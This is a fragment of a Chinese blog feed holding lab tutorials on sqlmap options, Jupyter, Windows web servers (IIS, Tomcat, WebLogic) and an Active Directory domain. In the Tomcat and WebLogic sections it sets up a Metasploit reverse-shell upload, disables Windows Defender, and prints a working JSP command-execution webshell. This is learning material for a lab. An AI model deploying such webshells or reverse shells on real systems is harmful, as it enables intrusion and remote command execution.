class="built_in">where</span>=DUMPWHERE   Use WHERE condition <span class="keyword">while</span> table dumping</span><br><span class="line">    --start=LIMITSTART  First dump table entry to retrieve</span><br><span class="line">    --stop=LIMITSTOP    Last dump table entry to retrieve</span><br><span class="line">    --first=FIRSTCHAR   First query output word character to retrieve</span><br><span class="line">    --last=LASTCHAR     Last query output word character to retrieve</span><br><span class="line">    --sql-query=SQLQ..  SQL statement to be executed</span><br><span class="line">    --sql-shell         Prompt <span class="keyword">for</span> an interactive SQL shell</span><br><span class="line">    --sql-file=SQLFILE  Execute SQL statements from given file(s)</span><br><span class="line"></span><br><span class="line">  Brute force:</span><br><span class="line">    These options can be used to run brute force checks</span><br><span class="line"></span><br><span class="line">    --common-tables     Check existence of common tables</span><br><span class="line">    --common-columns    Check existence of common columns</span><br><span class="line">    --common-files      Check existence of common files</span><br><span class="line"></span><br><span class="line">  User-defined <span class="keyword">function</span> injection:</span><br><span class="line">    These options can be used to create custom user-defined <span class="built_in">functions</span></span><br><span class="line"></span><br><span class="line">    --udf-inject        Inject custom user-defined <span class="built_in">functions</span></span><br><span class="line">    --shared-lib=SHLIB  Local path of the shared library</span><br><span class="line"></span><br><span class="line">  File system access:</span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system underlying file system</span><br><span class="line"></span><br><span class="line">    --file-read=FILE..  Read a file from the back-end DBMS file system</span><br><span class="line">    --file-write=FIL..  Write a <span class="built_in">local</span> file on the back-end DBMS file system</span><br><span class="line">    --file-dest=FILE..  Back-end DBMS absolute filepath to write to</span><br><span class="line"></span><br><span class="line">  Operating system access:</span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system underlying operating system</span><br><span class="line"></span><br><span class="line">    --os-cmd=OSCMD      Execute an operating system <span class="built_in">command</span></span><br><span class="line">    --os-shell          Prompt <span class="keyword">for</span> an interactive operating system shell</span><br><span class="line">    --os-pwn            Prompt <span class="keyword">for</span> an OOB shell, Meterpreter or VNC</span><br><span class="line">    --os-smbrelay       One click prompt <span class="keyword">for</span> an OOB shell, Meterpreter or VNC</span><br><span class="line">    --os-bof            Stored procedure buffer overflow exploitation</span><br><span class="line">    --priv-esc          Database process user privilege escalation</span><br><span class="line">    --msf-path=MSFPATH  Local path <span class="built_in">where</span> Metasploit Framework is installed</span><br><span class="line">    --tmp-path=TMPPATH  Remote absolute path of temporary files directory</span><br><span class="line"></span><br><span class="line">  Windows registry access:</span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system Windows registry</span><br><span class="line"></span><br><span class="line">    --reg-read          Read a Windows registry key value</span><br><span class="line">    --reg-add           Write a Windows registry key value data</span><br><span class="line">    --reg-del           Delete a Windows registry key value</span><br><span class="line">    --reg-key=REGKEY    Windows registry key</span><br><span class="line">    --reg-value=REGVAL  Windows registry key value</span><br><span class="line">    --reg-data=REGDATA  Windows registry key value data</span><br><span class="line">    --reg-type=REGTYPE  Windows registry key value <span class="built_in">type</span></span><br><span class="line"></span><br><span class="line">  General:</span><br><span class="line">    These options can be used to <span class="built_in">set</span> some general working parameters</span><br><span class="line"></span><br><span class="line">    -s SESSIONFILE      Load session from a stored (.sqlite) file</span><br><span class="line">    -t TRAFFICFILE      Log all HTTP traffic into a textual file</span><br><span class="line">    --answers=ANSWERS   Set predefined answers (e.g. <span class="string">&quot;quit=N,follow=N&quot;</span>)</span><br><span class="line">    --<span class="built_in">base64</span>=BASE64P..  Parameter(s) containing Base64 encoded data</span><br><span class="line">    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)</span><br><span class="line">    --batch             Never ask <span class="keyword">for</span> user input, use the default behavior</span><br><span class="line">    --binary-fields=..  Result fields having binary values (e.g. <span class="string">&quot;digest&quot;</span>)</span><br><span class="line">    --check-internet    Check Internet connection before assessing the target</span><br><span class="line">    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables</span><br><span class="line">    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL</span><br><span class="line">    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. <span class="string">&quot;logout&quot;</span>)</span><br><span class="line">    --csv-del=CSVDEL    Delimiting character used <span class="keyword">in</span> CSV output (default <span class="string">&quot;,&quot;</span>)</span><br><span class="line">    --charset=CHARSET   Blind SQL injection charset (e.g. <span class="string">&quot;0123456789abcdef&quot;</span>)</span><br><span class="line">    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)</span><br><span class="line">    --encoding=ENCOD..  Character encoding used <span class="keyword">for</span> data retrieval (e.g. GBK)</span><br><span class="line">    --eta               Display <span class="keyword">for</span> each output the estimated time of arrival</span><br><span class="line">    --flush-session     Flush session files <span class="keyword">for</span> current target</span><br><span class="line">    --forms             Parse and <span class="built_in">test</span> forms on target URL</span><br><span class="line">    --fresh-queries     Ignore query results stored <span class="keyword">in</span> session file</span><br><span class="line">    --gpage=GOOGLEPAGE  Use Google dork results from specified page number</span><br><span class="line">    --har=HARFILE       Log all HTTP traffic into a HAR file</span><br><span class="line">    --hex               Use hex conversion during data retrieval</span><br><span class="line">    --output-dir=OUT..  Custom output directory path</span><br><span class="line">    --parse-errors      Parse and display DBMS error messages from responses</span><br><span class="line">    --preprocess=PRE..  Use given script(s) <span class="keyword">for</span> preprocessing (request)</span><br><span class="line">    --postprocess=PO..  Use given script(s) <span class="keyword">for</span> postprocessing (response)</span><br><span class="line">    --repair            Redump entries having unknown character marker (?)</span><br><span class="line">    --save=SAVECONFIG   Save options to a configuration INI file</span><br><span class="line">    --scope=SCOPE       Regexp <span class="keyword">for</span> filtering targets</span><br><span class="line">    --skip-heuristics   Skip heuristic detection of vulnerabilities</span><br><span class="line">    --skip-waf          Skip heuristic detection of WAF/IPS protection</span><br><span class="line">    --table-prefix=T..  Prefix used <span class="keyword">for</span> temporary tables (default: <span class="string">&quot;sqlmap&quot;</span>)</span><br><span class="line">    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)</span><br><span class="line">    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)</span><br><span class="line">    --web-root=WEBROOT  Web server document root directory (e.g. <span class="string">&quot;/var/www&quot;</span>)</span><br><span class="line"></span><br><span class="line">  Miscellaneous:</span><br><span class="line">    These options <span class="keyword">do</span> not fit into any other category</span><br><span class="line"></span><br><span class="line">    -z MNEMONICS        Use short mnemonics (e.g. <span class="string">&quot;flu,bat,ban,tec=EU&quot;</span>)</span><br><span class="line">    --alert=ALERT       Run host OS <span class="built_in">command</span>(s) when SQL injection is found</span><br><span class="line">    --beep              Beep on question and/or when vulnerability is found</span><br><span class="line">    --dependencies      Check <span class="keyword">for</span> missing (optional) sqlmap dependencies</span><br><span class="line">    --disable-coloring  Disable console output coloring</span><br><span class="line">    --list-tampers      Display list of available tamper scripts</span><br><span class="line">    --no-logging        Disable logging to a file</span><br><span class="line">    --offline           Work <span class="keyword">in</span> offline mode (only use session data)</span><br><span class="line">    --purge             Safely remove all content from sqlmap data directory</span><br><span class="line">    --results-file=R..  Location of CSV results file <span class="keyword">in</span> multiple targets mode</span><br><span class="line">    --shell             Prompt <span class="keyword">for</span> an interactive sqlmap shell</span><br><span class="line">    --tmp-dir=TMPDIR    Local directory <span class="keyword">for</span> storing temporary files</span><br><span class="line">    --unstable          Adjust options <span class="keyword">for</span> unstable connections</span><br><span class="line">    --update            Update sqlmap</span><br><span class="line">    --wizard            Simple wizard interface <span class="keyword">for</span> beginner <span class="built_in">users</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jupyter</title>
      <link href="/2022/10/17/jupyter/"/>
      <url>/2022/10/17/jupyter/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装jupyter</span></span><br><span class="line">pip install notebook</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动jupyter</span></span><br><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure><p><strong>修改工作目录</strong><br>jupyter notebook –generate-config  生成配置文件</p><p><img src="/img/20230307091318.png"></p><p>编辑配置文件，找到c.NotebookApp.notebook_dir，取消注释并填写自己设定的工作目录。</p><p>加 r 是因为从文件夹复制过来的路径有反斜杠，防止转义。</p><p><img src="/img/20230307093550.png"></p><p><strong>使用bat脚本启动notebook</strong></p><p>启动之后不要关闭命令框，否则无法继续使用notebook</p><p><img src="/img/20230307094009.png"></p><p>踩过的坑：</p><p>“一运行jupyter.bat文件就会疯狂弹出cmd控制台”<br>因为文件名是 jupyter.bat，跟已有命令重复了。<br>换一个名字就好了，比如jupyter_1.bat</p><p><strong>基本操作</strong></p><p>退出编辑，边框变蓝色：esc</p><p>蓝框情况下，单元格类型转换快捷键：Y和M</p><p>插入单元格快捷键：A和B</p><p>代码补全：Tab</p><p>运行单元格：ctrl + enter</p><p>删除单元格：DD</p><p>收起运行结果：字母欧O</p><p>In [3] :数字3表示这个单元格运行了3次</p><p><strong>Markdown语法</strong></p><p><img src="/img/20230307103320.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows简单搭建网页</title>
      <link href="/2022/09/20/windows%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/"/>
      <url>/2022/09/20/windows%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>linux有LAMP和LNMP，那么windows也有建站套餐。</p><ol><li><p>IIS + asp.net + Sqlserver（IIS相当于Apache    asp.net相当于php）</p></li><li><p>tomcat + java + Sqlserver （tomcat和java都是开源的）</p></li><li><p>weblogic + java+ Sqlserver</p></li><li><p>weblogic + java + oracle （政府网站用这个套餐的比较多，因为oracle要钱，外包公司选这个方案能多挣点钱）</p></li><li><p>jboss + java + Sqlserver</p></li></ol><p>weblogic和jboss比较偏向商业。</p><h1 id="1-安装SQL-Server-2019"><a href="#1-安装SQL-Server-2019" class="headerlink" title="1 安装SQL Server 2019"></a>1 安装SQL Server 2019</h1><p>自行百度。</p><p>1433 sqlserver</p><p>3306 mysql mariadb</p><p>5432 postgresql 这个数据库也是开源的</p><p>1521 oracle</p><p>6379 redis</p><h1 id="2-安装IIS"><a href="#2-安装IIS" class="headerlink" title="2 安装IIS"></a>2 安装IIS</h1><p><img src="/img/20230204185910.png"></p><p><img src="/img/20230204190037.png"></p><p><img src="/img/20230204190103.png"></p><h1 id="3-创建静态网站"><a href="#3-创建静态网站" class="headerlink" title="3 创建静态网站"></a>3 创建静态网站</h1><p>选择特定用户,点击设置,在弹出的设置凭据中输入超级管理员的用户名和密码;在生产环境下这样设置是不严谨的,需要把文件夹授权给普通用户,然后设置普通用户为网站使用用户,这样可以权限最小化.实验环境无所谓,依次点击确定即可。</p><p><strong>C:&#x2F;www&#x2F;index.html</strong> </p><p>IIS设定填写主机名后就不可以使用IP进行访问了。</p><p>给网站根目录文件夹设置权限，在www文件夹处右键属性-&gt;安全-&gt;编辑-&gt;添加。</p><p>添加NETWORK SERVICE用户。</p><p>设置用户权限为读写或者完全控制。</p><p><strong>windows大小写不敏感</strong> </p><h1 id="4-创建动态网站"><a href="#4-创建动态网站" class="headerlink" title="4 创建动态网站"></a>4 创建动态网站</h1><p>C:&#x2F;www&#x2F;1.aspx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot;%&gt; &lt;% Response.Write(&quot;hello,world&quot;); %&gt; (1.aspx或asp.net)</span><br></pre></td></tr></table></figure><p>其他后缀：<code>.action</code> 是strus2框架所带的后缀，例如login.action，其底层本质还是java语言。</p><h1 id="5-安装tomcat"><a href="#5-安装tomcat" class="headerlink" title="5 安装tomcat"></a>5 安装tomcat</h1><p>安装tomcat之前要安装好java。</p><p><img src="/img/20230204214058.png"></p><p>安装并启动tomcat服务，关闭防火墙或者开放8080端口，访问localhost:8080。</p><h2 id="实验（一）"><a href="#实验（一）" class="headerlink" title="实验（一）"></a>实验（一）</h2><p>写一个jsp文件,验证解析情况</p><p>在tomcat文档目录C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\docs中新建一个test.jsp文件</p><p><img src="/img/20230204214858.png"></p><p>在test.jsp中写入：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">&quot;Hello World!&quot;</span>); </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>打开浏览器访问<a href="http://127.0.0.1:8080/docs/test.jsp%E5%8F%91%E7%8E%B0helloworld%E8%A2%AB%E6%88%90%E5%8A%9F%E8%A7%A3%E6%9E%90%E3%80%82">http://127.0.0.1:8080/docs/test.jsp发现helloworld被成功解析。</a></p><h2 id="实验（二）"><a href="#实验（二）" class="headerlink" title="实验（二）"></a>实验（二）</h2><p>使用war包部署一个web网站</p><p>浏览器输入<a href="http://127.0.0.1:8080,点击Manager/">http://127.0.0.1:8080,点击Manager</a> App进入管理界面。<img src="/img/20230204215126.png"></p><p>在kali浏览器中打开<code>http://windows的ip:8080/</code>，点击Manager APP会403。</p><p>修改服务器文件C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf\tomcat-users.xml</p><p>在<code>&lt;/tomcat-users&gt;</code>前添加:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt; &lt;role rolename=&quot;admin-script&quot;/&gt; &lt;role rolename=&quot;manager-gui&quot;/&gt; &lt;role rolename=&quot;manager-script&quot;/&gt; &lt;role rolename=&quot;manager-jmx&quot;/&gt; &lt;role rolename=&quot;manager-status&quot;/&gt; &lt;user username=&quot;farmsec&quot; password=&quot;123456&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-script,admin-gui&quot;/&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/20230204215559.png"></p><p>修改服务器文件C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\manager\META-INF\context.xml，使用<code>&lt;!-- --&gt;</code>注释掉以下内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1&quot; /&gt;` `&lt;Manager sessionAttributeValueClassNameFilter=&quot;java\.lang\.(?:Boolean|Integer|Long|Number|String)|org\.apache\.catalina\.filters\.CsrfPreventionFilter\$LruCache(?:\$1)?|java\.util\.(?:Linked)?HashMap&quot;/&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/20230204215801.png"></p><p>重启tomcat服务，在系统托盘下有图标，点开后点击stop，再点击start即可。</p><p>正常访问。</p><p><img src="/img/20230204215949.png"></p><p>输入安装时设置的账号密码：farmsec   123456，点击确定。</p><p>下滑找到要部署的WAR文件处，点击浏览，选中提前准备好的jenkins.war包打开即可。浏览器语言如果是中文，它就是中文，浏览器语言是英文，它就是英文。</p><p><img src="/img/20230204221328.png"></p><p>点击部署即可自动部署war包，发现报错失败 - 部署上传失败，异常信息：[org.apache.tomcat.util.http.fileupload.impl.SizeLimitExceededException: the request was rejected because its size (70809454) exceeds the configured maximum (52428800)]。这个代表war包太大，无法上传。</p><p>需要修改C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\manager\WEB-INF\web.xml文件，调整下面如图两行的数值大小，例如每个数字加两个零。</p><p><img src="/img/20230204221627.png"></p><p>右下角再次重启tomcat服务后再次上传，部署完成后，访问<a href="http://127.0.0.1:8080/jenkins%E5%8D%B3%E5%8F%AF%E8%BF%9B%E3%80%82">http://127.0.0.1:8080/jenkins即可进。</a></p><p><img src="/img/20230204222010.png"></p><h2 id="实验（三）"><a href="#实验（三）" class="headerlink" title="实验（三）"></a>实验（三）</h2><p>上传存有木马的war包获取webshell</p><p>kali打开msfconsole</p><p><img src="/img/20230204222635.png"></p><p>使用tomcat_mgr_upload模块，此模块可用于在具有公开“管理器”应用程序的Apache Tomcat服务器上执行有效负载。有效负载作为WAR存档上载，包含使用针对&#x2F; manager &#x2F; html &#x2F; upload组件的POST请求的jsp应用程序。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use multi/http/tomcat_mgr_upload</span><br><span class="line"><span class="built_in">set</span> httpusername farmsec <span class="comment">#设置Manager管理页面的用户名</span></span><br><span class="line"><span class="built_in">set</span> httppassword 123456 <span class="comment">#设置Manager管理页面的密码</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.0.112 <span class="comment">#设置目标IP</span></span><br><span class="line"><span class="built_in">set</span> rport 8080 <span class="comment">#设置目标端口</span></span><br><span class="line"><span class="built_in">set</span> payload java/shell_reverse_tcp <span class="comment">#设置payload</span></span><br><span class="line"><span class="built_in">set</span> FingerprintCheck <span class="literal">false</span> <span class="comment">#设置跳过指纹检测</span></span><br><span class="line"><span class="built_in">set</span> lhost 192.168.0.50 <span class="comment">#指定kali本机IP，一般不用设置，自动就设置好了</span></span><br><span class="line">打开Windows安全设置，左侧点击病毒和威胁防护，点击“病毒和威胁防护”设置下的管理设置，关闭实时保护、云提供的保护、自动提交样本</span><br><span class="line">输入run或者exploit启动攻击</span><br><span class="line">输入chcp 65001解决乱码问题，然后就可以执行命令了</span><br></pre></td></tr></table></figure><h1 id="6-weblogic"><a href="#6-weblogic" class="headerlink" title="6 weblogic"></a>6 weblogic</h1><p> WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><p> WebLogic是美商Oracle的主要产品之一，是并购BEA得来。是商业市场上主要的Java（J2EE）应用服务器软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器, 已推出到12c(12.2.1.4) 版。而此产品也延伸出WebLogic Portal，WebLogic Integration等企业用的中间件（但当下Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE(Oracle Enterprise Pack for Eclipse)开发工具。</p><h2 id="6-1-安装weblogic"><a href="#6-1-安装weblogic" class="headerlink" title="6.1 安装weblogic"></a>6.1 安装weblogic</h2><p>安装weblogic之前要自行安装好java。</p><p>1.解压weblogic安装文件（fmw_14.1.1.0.0_wls_lite_Disk1_1of1.zip）</p><p><img src="/img/20230205090801.png"></p><p>2.直接双击打开解压后的jar文件，如果打不开就用命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar .\fmw_14.1.1.0.0_wls_lite_generic.jar</span><br></pre></td></tr></table></figure><p>3.在弹出的欢迎使用界面点击下一步</p><p>4.自动更新设置，一般来说在生产环境下一般是要确认更新到同一版本同一补丁，实验环境使用默认跳过自动更新即可</p><p>5.选择安装主目录，正常应该避免放到C盘，实验环境直接下一步</p><p>6.安装类型选择Weblogic Server，Coherence是集群化使用的。</p><p>7.先决条件检查，检查系统版本及JDK版本，通过后直接下一步</p><p>8.安装概要，直接下一步，响应文件为debug使用，正常安装不需要查看，直接点击安装</p><p>9.安装进行中，时间比较长，完成后点击下一步</p><p>10.安装完成，点击完成后会打开自动配置向导</p><p>11.域配置，选择创建新域，域位置可以自行选择。实验环境保持默认即可</p><p>12.模板设置为了保证各种功能，所以全选即可</p><p>13.设置管理员账号和密码</p><p>14.设置域模式和jdk。开发模式启用自动部署，生产模式关闭自动部署，生产模式是为保证速度快放在指定目录下，他的包不会自动更新。开发模式是比较自由的，它保证开发灵活性，随便把它扔哪里都会自动更新，这样会影响速度。一般地开发好的产品，都给客户用生产模式部署，实验环境选择开发模式也可以。jdk会自己检测，默认即可。</p><p>15.高级配置为了保证功能完整性全选即可。</p><p>16.管理服务器可以自定义名称端口等，这里保持默认即可，也可以自修改，由于没有证书，ssl(https)就放弃勾选了</p><p>17.节点管理器需要设置账号密码，注意密码复杂度要求</p><p>18.受管服务器没有可以留空</p><p>19.集群没有也可以留空</p><p>20.服务器模板和第二项设置相同，无集群的话留空直接下一步即可</p><p>21.Coherence集群设置保持默认端口即可</p><p>22.计算机设置作用是设置节点计算机，直接下一步</p><p>23.部署定位，直接下一步即可</p><p>24.服务定位，直接下一步即可</p><p>25.文件储存及同步配置，保持默认即可</p><p>26.配置概要及文件位置，点击创建即可开始配置</p><p>27.配置进度走完点击下一步</p><p>28.配置成功，显示域位置以及网页管理地址，靠左偏下位置有一个启动管理服务器，勾选上点完成就启动了，不用双击打开了。</p><p>29.双击打开</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">C:<span class="keyword">\Oracle</span><span class="keyword">\Middleware</span><span class="keyword">\Oracle</span><span class="built_in">_</span>Home<span class="keyword">\user</span><span class="built_in">_</span>projects<span class="keyword">\domains</span><span class="keyword">\base</span><span class="built_in">_</span>domain<span class="keyword">\startWebLogic</span>.cmd</span><br></pre></td></tr></table></figure><p>30.最小化cmd，浏览器打开<a href="http://127.0.0.1:7001/console">http://127.0.0.1:7001/console</a> ,进入控制台，浏览器语言如果是中文，它就是中文，浏览器语言是英文，它就是英文。</p><p>直接访问<a href="http://127.0.0.1:7001会出现404，记住这个页面，以后遇到就知道是weblogic了。">http://127.0.0.1:7001会出现404，记住这个页面，以后遇到就知道是weblogic了。</a></p><p><img src="/img/20230205092554.png"></p><p>31.配置控制台外部ip访问（生产环境禁用，和tomcat类似，极易产生安全风险），也可以直接关闭防火墙。</p><p>(1)登录控制台</p><p>(2)点击左侧域结构导航栏中的环境，选择服务器</p><p>(3)点击AdminServer (管理)，进入配置界面</p><p>(4)监听地址填入0.0.0.0后点击保存</p><p>(5)在外部机器上使用firefox即可访问</p><p><strong>实现控制台和网站使用不同端口</strong>：</p><p><a href="https://blog.csdn.net/su1573/article/details/118335235">https://blog.csdn.net/su1573/article/details/118335235</a></p><h2 id="6-2-部署war包"><a href="#6-2-部署war包" class="headerlink" title="6.2 部署war包"></a>6.2 部署war包</h2><p>(1)点击左侧域结构导航栏中的部署，点击安装</p><p>(2)选定war包位置点击下一步</p><p>(3)安装类型选择将此部署安装为应用程序</p><p>(4)安装应用程序辅助程序处按照实际情况进行设置，实验环境可以直接下一步</p><p>(5)点击完成按钮完成部署</p><p>(6)查看已安装配置然后点击保存</p><p>(7)访问<a href="http://ip:7001/jenkins%E5%8D%B3%E5%8F%AF">http://ip:7001/jenkins即可</a></p><p><strong>由于性能问题，部署项目可能会出现503的现象，尤其是设置监听地址0.0.0.0后，也可能出现启动weblogic出现“unicast networking appears to be inoperable on interface 0.0.0.0 as this process isn’t receiving even its own transmissions”。</strong></p><p><strong>解决方案是</strong>：</p><p>先删除文件夹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Oracle\Middleware\Oracle_Home\user_projects\domains</span><br></pre></td></tr></table></figure><p>再双击新建域就好了，新建以后直接部署web项目即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Oracle\Middleware\Oracle_Home\oracle_common\common\bin\config.cmd</span><br></pre></td></tr></table></figure><h2 id="6-3-部署非war包项目"><a href="#6-3-部署非war包项目" class="headerlink" title="6.3 部署非war包项目"></a>6.3 部署非war包项目</h2><p>1.点击左侧域结构导航栏中的部署，点击安装</p><p>2.选定web应用主目录（不要点击打开目录)</p><p>3.安装应用程序辅助程序处按照实际情况进行设置，实验环境可以直接下一步</p><p>4.点击完成按钮完成部署</p><p>5.查看已安装配置然后点击保存</p><p>6.访问<a href="http://127.0.0.1:7001/ROOT%E5%8D%B3%E5%8F%AF%E6%89%93%E5%BC%80">http://127.0.0.1:7001/ROOT即可打开</a></p><p><strong>由于性能问题，部署项目可能会出现503的现象，尤其是设置监听地址0.0.0.0后，也可能出现启动weblogic出现“unicast networking appears to be inoperable on interface 0.0.0.0 as this process isn’t receiving even its own transmissions”。</strong></p><p><strong>解决方案是</strong>：</p><p>先删除文件夹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Oracle\Middleware\Oracle_Home\user_projects\domains</span><br></pre></td></tr></table></figure><p>再双击新建域就好了，新建以后直接部署web项目即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Oracle\Middleware\Oracle_Home\oracle_common\common\bin\config.cmd</span><br></pre></td></tr></table></figure><h2 id="6-4-部署jsp一句话木马"><a href="#6-4-部署jsp一句话木马" class="headerlink" title="6.4 部署jsp一句话木马"></a>6.4 部署jsp一句话木马</h2><p>1.jsp一句话木马</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>2.生成war包后部署在weblogic上</p><p>3.部署完成后访问<a href="http://ip:prot/shell/1.jsp?pwd=023&i=whoami">http://ip:prot/shell/1.jsp?pwd=023&amp;i=whoami</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建域环境2012</title>
      <link href="/2022/08/16/%E6%90%AD%E5%BB%BA%E5%9F%9F%E7%8E%AF%E5%A2%832012/"/>
      <url>/2022/08/16/%E6%90%AD%E5%BB%BA%E5%9F%9F%E7%8E%AF%E5%A2%832012/</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装域服务"><a href="#1-安装域服务" class="headerlink" title="1 安装域服务"></a>1 安装域服务</h1><p><img src="/img/20220616105947.png"></p><p><img src="/img/image-20220617103633051.png"></p><p>其余步骤默认下一步就行了，安装完点击提升为域控制器。</p><p><img src="/img/20220617103824.png"></p><p>选择添加新林，随便写一个根域名，下一步。</p><p><img src="/img/20220617104239.png"></p><p>设置域管理administrator的密码，自己记好。</p><p><img src="/img/20220617104548.png"></p><p>之后一直默认下一步，最后安装即可，最后会重启。</p><h1 id="2-新建用户"><a href="#2-新建用户" class="headerlink" title="2 新建用户"></a>2 新建用户</h1><p>重启完成后，执行<code>net accounts /maxpwage:unlimited</code> 使密码永不过期，否则默认的是42天密码过期，到时候要换密码，很麻烦。</p><p><img src="/img/20220617152948.png"></p><p>打开AD DS，在2012DC右键打开AD用户和计算机。</p><p><img src="/img/20220617151743.png"></p><p>在hack.com右键新建一个组织单位group_test。</p><p><img src="/img/20220617152051.png"></p><p><img src="/img/20220617152157.png"></p><p>在group_test中新建一个用户user1。</p><p><img src="/img/20220617152520.png"></p><p><img src="/img/20220617152650.png"></p><p><img src="/img/20220617152722.png"></p><h1 id="3-固定ip"><a href="#3-固定ip" class="headerlink" title="3 固定ip"></a>3 固定ip</h1><p>先查看ip是多少，然后打开IPv4的属性如下固定ip。</p><p><img src="/img/20220617171638.png"></p><h1 id="4-加入域"><a href="#4-加入域" class="headerlink" title="4 加入域"></a>4 加入域</h1><p>打开另一台虚拟机，把DNS改为域控制器的ip。</p><p><img src="/img/20220617172449.png"></p><p>打开更改设置。</p><p><img src="/img/20220617172006.png"></p><p>点击更改。</p><p><img src="/img/20220617172041.png"></p><p>改成隶属于hack.com域。</p><p><img src="/img/20220617172133.png"></p><p>使用user1用户密码加入hack.com域。</p><p><img src="/img/20220617172556.png"></p><p>重启之后使用user1用户进入。</p><p><img src="/img/20220617172803.png"></p><p><img src="/img/20220617172849.png"></p><p>user1用户登录进去后，想换回administrator本地用户可以注销。</p><p><img src="/img/20220617174040.png"></p><p>然后以<code>计算机名\administrator</code>的方式登录。</p><p><img src="/img/20220617173941.png"></p><p>查看是否在域里面：net config workstation</p><p><img src="/img/20220617174422.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 域服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口与协议</title>
      <link href="/2022/07/25/%E7%AB%AF%E5%8F%A3%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/07/25/%E7%AB%AF%E5%8F%A3%E5%8D%8F%E8%AE%AE/</url>
      
